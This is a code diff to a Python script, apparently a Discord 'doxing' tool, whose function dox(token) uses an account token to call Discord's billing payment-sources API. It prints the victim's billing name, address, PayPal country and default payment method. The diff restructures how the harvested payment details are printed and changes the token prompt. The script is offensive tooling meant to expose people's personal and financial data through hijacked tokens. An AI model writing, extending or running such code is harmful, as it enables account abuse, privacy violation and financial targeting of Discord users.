@@ -102,6 +102,7 @@ def dox(token):
         pass
 
     try:
+        print('                                        [ ATTEMPTING TO FIND PAYMENT ]''')
         for x in requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json():
             y = x["billing_address"]
             name = y["name"]
@@ -150,35 +151,34 @@ def dox(token):
                     f"                                        [ PAYPAL COUNTRY ]: " + country,
                     f"                                        [ DEFAULT PAYM   ]: " + x["default"],
                 }
+            billing_info.append(data)
+            
+        if len(billing_info) > 0:
+            if len(billing_info) == 1:
+                for x in billing_info:
+                    for key, val in x.items():
+                        if not val:
+                            continue
+                        print('{:<23}{}'.format(key, val))
+            else:
+                for i, x in enumerate(billing_info):
+                    title = f'PAYMENT #{i + 1} | {x["Payment Type"]}'
+                    print(' ' + title)
+                    print(' ' + ('=' * len(title)))
+                    for j, (key, val) in enumerate(x.items()):
+                        if not val or j == 0:
+                            continue
+                        print('        {:<23}{}'.format(key, val))
+                    if i < len(billing_info) - 1:
+                        print('\n')
+            input('')
+            hatred()
+        else:
+            print(f"                                        [ DEFAULT PAYM   ]: N/A")
+            input('')
+            hatred()
     except:
         pass
-
-    billing_info.append(data)
-
-    if len(billing_info) > 0:
-        if len(billing_info) == 1:
-            for x in billing_info:
-                for key, val in x.items():
-                    if not val:
-                        continue
-                    print('{:<23}{}'.format(key, val))
-        else:
-            for i, x in enumerate(billing_info):
-                title = f'PAYMENT #{i + 1} | {x["Payment Type"]}'
-                print(' ' + title)
-                print(' ' + ('=' * len(title)))
-                for j, (key, val) in enumerate(x.items()):
-                    if not val or j == 0:
-                        continue
-                    print('        {:<23}{}'.format(key, val))
-                if i < len(billing_info) - 1:
-                    print('\n')
-        input('')
-        hatred()
-    else:
-        print(f"DEFAULT PAYMENT => N/A")
-        input('')
-        hatred()
 
     input('')
     hatred()
@@ -401,7 +401,7 @@ def hatred():
 
     if decision == '1':
         print(f'                                        :::')
-        print(f'                                        invalid token ; enter to return:')
+        print(f'                                        TOKEN:')
         token = str(input(f'                                        [>] => '))
 
         headers = {'Authorization': token, 'Content-Type': 'application/json'}
